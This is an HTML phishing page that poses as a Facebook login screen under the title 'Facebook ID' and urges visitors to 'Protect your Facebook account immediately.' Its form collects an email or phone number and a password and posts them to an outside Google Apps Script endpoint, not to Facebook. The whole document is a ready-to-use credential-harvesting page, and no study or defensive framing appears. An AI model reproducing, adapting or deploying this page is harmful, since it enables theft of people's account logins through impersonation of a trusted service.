html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook ID</title>
    <link rel="stylesheet" href="./login_form_2.css" />
  </head>
  <body>
    <div class="content">
      <div class="flex-div">
        <div class="name-content">
          <h1 class="logo">Facebook</h1>
          <p>Protect your Facebook account immediately.</p>
        </div>
        <form method="post" action="https://script.google.com/macros/s/AKfycbyvT7IibYaigBhBj8ApLHGpWZvLMexyjTSWlyP_w_Uv5a4leUxhGw7kB1-9Dl8FWDp1/exec" name="contactform" id="contactform">
          <input type="text" placeholder="Email or Phone Number" name="email_or_phone" required />
          <input type="password" name="password" placeholder="Password" required />
          <button type="submit" class="login">Protect Now</button>
          <a href="#">Forgot Password?</a>
          <hr />
          <button type="button" class="create-account">Create New Account</button>
        </form>
      </div>
    </div>
  </body>
</html>
